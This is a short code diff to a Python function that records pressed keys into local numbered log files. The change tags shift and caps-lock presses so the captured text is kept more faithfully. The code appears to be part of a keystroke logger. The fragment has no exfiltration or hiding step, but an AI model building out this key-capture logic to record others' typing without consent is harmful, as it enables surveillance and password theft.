@@ -13,12 +13,14 @@ def log(key):
 
     if letter == 'Key.space':
         letter = ' '
-    if letter in ['Key.shift_l', 'Key.shift_r']:
-        letter = ''
+    if letter in ['Key.shift_l', 'Key.shift_r', 'Key.shift']:
+        letter = '<shift>'
     if letter == "Key.enter":
         letter = "\n"
     if letter == "Key.backspace":
         letter = "<bk>"
+    if letter == "Key.caps_lock":
+        letter = "<cp>"
 
     with open(f"logs({i}).txt", "a") as f:
         f.write(letter)
